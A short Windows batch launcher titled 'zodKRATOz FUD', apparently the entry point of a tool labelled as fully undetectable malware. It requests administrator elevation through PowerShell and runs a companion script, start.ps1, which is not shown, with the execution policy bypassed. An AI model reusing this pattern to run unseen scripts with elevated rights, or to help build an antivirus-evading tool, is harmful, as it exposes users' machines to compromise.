@echo off
title zodKRATOz FUD

net session >nul 2>&1
if not %errorLevel% == 0 (
    echo Solicitando permissao de administrador...
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -NoExit -File \"%~dp0start.ps1\"'"
    exit /b
)

powershell.exe -NoProfile -ExecutionPolicy Bypass -NoExit -File "%~dp0start.ps1"
